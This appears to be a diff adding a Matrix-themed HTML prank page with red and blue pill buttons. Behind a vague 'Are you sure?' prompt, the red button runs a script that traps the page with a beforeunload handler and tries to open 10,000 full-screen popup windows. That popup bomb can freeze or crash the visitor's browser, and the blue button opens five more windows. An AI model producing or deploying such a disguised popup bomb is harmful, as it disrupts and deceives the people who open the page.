@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Matrix</title>
+    <style>
+      body {
+        background: black;
+      }
+      .buttonred {
+        background: red;
+        font-family: monospace;
+        color: black;
+        width: 10%;
+        padding: 10px;
+        border: 3px solid red;
+        display: block;
+        margin-right: auto;
+        margin-left: auto;
+        transition: 0.5s ease;
+        border-radius: 20px;
+        font-size: 20px;
+      }
+      .buttonblue {
+        background: blue;
+        font-family: monospace;
+        color: black;
+        width: 10%;
+        padding: 10px;
+        display: block;
+        margin-right: auto;
+        border: 3px solid blue;
+        margin-left: auto;
+        transition: 0.5s ease;
+        border-radius: 20px;
+        font-size: 20px;
+      }
+      .buttonred:hover {
+        background: black;
+        font-family: monospace;
+        color: red;
+        width: 20%;
+        border: 3px solid red;
+        padding: 10px;
+        transition: 0.5s ease;
+        text-shadow:0px 0px 6px red;
+        box-shadow: 0px 0px 6px red;
+        border-radius: 20px;
+        animation: fly 1s;
+      }
+      .buttonblue:hover {
+        background: black;
+        font-family: monospace;
+        color: blue;
+        width: 20%;
+        border: 3px solid blue;
+        padding: 10px;
+        transition: 0.5s ease;
+        text-shadow:0px 0px 6px blue;
+        box-shadow: 0px 0px 6px blue;
+        border-radius: 20px;
+        animation: fly 1s;
+      }
+      .text {
+        color: white;
+        text-shadow: 0px 0px 8px white;
+        font-family: monospace;
+        font-size: 40px;
+        text-align: center;
+        transition: 0.5s ease;
+      }
+      .text2 {
+        color: white;
+        text-shadow: 0px 0px 4px white;
+        font-family: monospace;
+        font-size: 20px;
+        text-align: center;
+        transition: 0.5s ease;
+      }
+      .text:hover {
+        letter-spacing: 15px;
+        animation: fly 1s;
+        transition: 0.5s ease;
+      }
+      .text2:hover {
+        letter-spacing: 10px;
+        animation: fly 1s;
+        transition: 0.5s ease;
+      }
+      @keyframes fly {
+        0% { transform: translate(0px,0px) rotate(0deg); }
+        25% { transform: translate(0px,0px) rotate(2deg); }
+        50% { transform: translate(0px,0px) rotate(-2deg); }
+        75% { transform: translate(0px 0px) rotate(0deg); }
+        100% { transform: translate(0px,0px) rotate(0deg); }
+      }
+      @keyframes down {
+        0% { transform: translate(0px,0px) rotate(0deg); }
+        25% { transform: translate(0px,0px) rotate(0deg); }
+        50% { transform: translate(0px,0px) rotate(0deg); }
+        75% { transform: translate(0px 0px) rotate(0deg); }
+        100% { transform: translate(0px,0px) rotate(0deg); }
+      }
+    </style>
+  </head>
+  <body>
+  <br>
+  <h1 class="text">M A T R I X</h1>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <button class="buttonred" onclick="javascript:redPill()">Red</button>
+  <br>
+  <h2 class="text2">Chose Wisely.</h2>
+  <br>
+  <button class="buttonblue" onclick="javascript:bluePill()">Blue</button>
+    <script>
+      function getRandomInt(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min) + min);
+      }
+      var randomNumber = getRandomInt(0,9);
+      function redPill() {
+        if (confirm("Are you sure?")) {
+          window.addEventListener('keydown', (e) => {
+            console.log(e)
+          })
+          window.dispatchEvent(new KeyboardEvent('keydown', {
+            'key': 'a'
+          }));
+          window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = '';
+          });
+          var fakeWindow = window.open("",);
+          for (let i=0; i<10000; i++) {
+            var spamWindow = window.open(randomLink, "", "width=1920, height=1080");
+            var randomNumber = getRandomInt(0,9);
+            var randomLink = 'https://www.google.com/search?q=' + randomNumber
+            for (let i=0; i<5; i++) {
+              var randomLink = randomLink + randomNumber
+              var randomNumber = getRandomInt(100,999);
+            }
+            var randomLink = 'https://www.google.com/search?q='
+          }
+        } else {
+          window.alert("All right. Try again when you're ready.")
+        }
+      }
+      function bluePill() {
+        if (confirm("Are you sure?")) {
+          for (let i=0; i<5; i++) {
+            var smallWindow = window.open("matrix", "", "width=1920,height=1080");
+          }
+        } else {
+          window.alert("All right. Try again when you're ready.")
+        }
+      }
+  </script>
+  </body>
+</html>
